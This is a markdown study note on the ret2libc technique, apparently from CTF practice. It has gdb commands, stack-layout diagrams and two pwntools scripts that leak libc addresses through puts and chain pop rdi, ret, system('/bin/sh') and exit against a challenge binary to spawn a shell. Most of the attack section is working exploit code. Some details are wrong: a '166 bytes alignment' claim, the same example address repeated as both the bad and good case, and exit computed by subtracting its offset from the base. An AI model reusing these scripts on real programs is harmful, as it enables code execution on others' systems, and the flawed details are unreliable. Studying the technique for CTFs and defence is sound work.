## Return to Libc

`ret2libc` is a way to bypass NX protection.

## Listing Dinamically Linked Files
```
$ ldd FILENAME
```

## Finding `/bin/sh` Offset
```
$ strings -a -t x /lib32/libc.so.6 | grep "/bin/sh"
```
The absolute address can be obtained by adding to the base address.
We can get the base address of the elf by gdb.
```
(gdb) info proc mappings
```

## Finding `system()` Offset
If ASLR is disabled.
```
(gdb) p system
```
If ASLR is enabled, we need to leak and calculate the libc base address.

## Finding `exit()` Offset
If ASLR is disabled.
```
(gdb) p exit
```
If ASLR is enabled, we need to leak and calculate the libc base address.


## Exploit
For x86
```
+----------------------------+
|          "/bin/sh"         |
+----------------------------+
|           exit()           |
+----------------------------+
|          system()          |
+----------------------------+
|AAAAAAAAAAAAAAAAAAAAAAAAAAAA|
+----------------------------+
|                            |
```

For x64
```
+----------------------------+
|           exit()           |
+----------------------------+
|          system()          |
+----------------------------+
|          "/bin/sh"         |
+----------------------------+
|        pop rdi; ret        |
+----------------------------+
|AAAAAAAAAAAAAAAAAAAAAAAAAAAA|
+----------------------------+
|                            | <= This might not work (alignment issue address of system() must be of 166 bytes alignment i.e address of system() must end in 0 (0x7feffd1e18) (not 8 like 0x7feffd1e18) This is why we need to add `ret` gadget to pad the address space)
```

```
+----------------------------+
|           exit()           |
+----------------------------+
|          system()          |
+----------------------------+
|            ret             | <= this works 
+----------------------------+
|          "/bin/sh"         |
+----------------------------+
|        pop rdi; ret        |
+----------------------------+
|AAAAAAAAAAAAAAAAAAAAAAAAAAAA|
+----------------------------+
|                            |
```

### Leaking and Calculate the libc base Address for ASLR enabled ELFs
1. Leaking resolved libc GOT Addresses by controlling return address to puts
```
from pwn import *

elf = context.binary = ELF('./pwn109-1644300507645.pwn109', checksec=False)
p = process(['./pwn109-1644300507645.pwn109'])
rop = ROP(elf)

pop_rdi_ret = rop.find_gadget(['pop rdi'])[0]
#print(hex(pop_rdi_ret))
pop_rdi_ret = p64(pop_rdi_ret)
puts_plt = p64(elf.plt['puts'])

puts_got = p64(elf.got['puts'])
gets_got = p64(elf.got['gets'])
setvbuf_got = p64(elf.got['setvbuf'])
main = p64(elf.symbols['main'])

payload = b"A" * 32
payload += b"B" * 8
payload += pop_rdi_ret + puts_got + puts_plt
payload += pop_rdi_ret + gets_got + puts_plt
payload += pop_rdi_ret + setvbuf_got + puts_plt

p.recvuntil("ahead")
p.recv()
p.sendline(payload)
leaked = p.recv()
leaked = leaked.strip().split(b'\n')
puts_got = u64(leaked[0].ljust(8, b"\x00"))
gets_got = u64(leaked[1].ljust(8, b"\x00"))
setvbuf_got = u64(leaked[2].ljust(8, b"\x00"))

print(hex(puts_got))
print(hex(gets_got))
print(hex(setvbuf_got))

#p.interactive()
```

2. Once we have successfully leaked the addresses, the following websites can be used to calculate offset to the libc base address
```
https://libc.nullbyte.cat <=
https://libc.blukat.me
https://libc.rip
```
or
We can just take the base address of libc by 
```
(gdb) info proc mappings
```
The we subtract the libc address of puts functions by libc base address
```
puts_offset = puts_libc - libc_base
```
To find the `puts_libc`, we need to check the got entry in gdb. `[plt_and_got.md]`

When runtime we can just use this offset to get the libc base address.
```
libc_base = leaked_puts_libc - puts_offset
```

3. Once we have calculate the base address of libc, we need to find the offsets of `system()` and `/bin/sh` to add to the base address of 

### Exploit
```python3
from pwn import *

#context.log_level = "debug"
elf = context.binary = ELF('./pwn109-1644300507645.pwn109', checksec=False)
p = process(['./pwn109-1644300507645.pwn109'])
rop = ROP(elf)
#gdb.attach(p)

pop_rdi_ret = rop.find_gadget(['pop rdi'])[0]
#print(hex(pop_rdi_ret))
pop_rdi_ret = p64(pop_rdi_ret)
puts_plt = p64(elf.plt['puts'])

puts_got = p64(elf.got['puts'])
gets_got = p64(elf.got['gets'])
setvbuf_got = p64(elf.got['setvbuf'])
main = p64(elf.symbols['main'])

## LEAKING
payload = b"A" * 32
payload += b"B" * 8
payload += pop_rdi_ret + puts_got + puts_plt
payload += pop_rdi_ret + gets_got + puts_plt
payload += pop_rdi_ret + setvbuf_got + puts_plt
#payload += p64(0x000000000040101a) #ret
payload += main

p.recvuntil("ahead")
p.recv()
p.sendline(payload)
leaked = p.recv()
leaked = leaked.strip().split(b'\n')
puts_got = u64(leaked[0].ljust(8, b"\x00"))
gets_got = u64(leaked[1].ljust(8, b"\x00"))
setvbuf_got = u64(leaked[2].ljust(8, b"\x00"))
######

#print(hex(puts_got))
#print(hex(gets_got))
#print(hex(setvbuf_got))

puts_libc_offset = 0x80e50
libc_base = puts_got - puts_libc_offset
#print(hex(libc_base))

system_offset = 0x50d70
system = libc_base + system_offset
print(hex(system))

bin_sh_offset = 0x1d8678
bin_sh = libc_base + bin_sh_offset
print(hex(bin_sh))

exit = libc_base - 0x455f0

payload = b"A" * 32
payload += b"B" * 8
payload += pop_rdi_ret
payload += p64(bin_sh)
payload += p64(0x000000000040101a) #ret
payload += p64(system)
payload += p64(exit)

#p.recvuntil("ahead")
#p.recv()
p.sendline(payload)

p.interactive()

# ------------------------------------------------------------------------------------
# Addresses				Offsets			Descriptions	Method
# 0x7ffff7d7f000		None			libc_base		(gdb) info proc mappings
# 0x00007ffff7dffe50	0x80e50			puts_libc		disassembly plt and examine got in gdb
# 0x00007ffff7dff520	0x80520			gets_libc		disassembly plt and examine got in gdb
# 0x00007ffff7e005f0	0x815f0			setvbuf_libc	disassembly plt and examine got in gdb
# 0x7ffff7dcfd70		0x50d70			system			(gdb) p system
# None					0x1d8678		"/bin/sh"		strings -a -t x /usr/lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
# None					0x455f0			exit

```
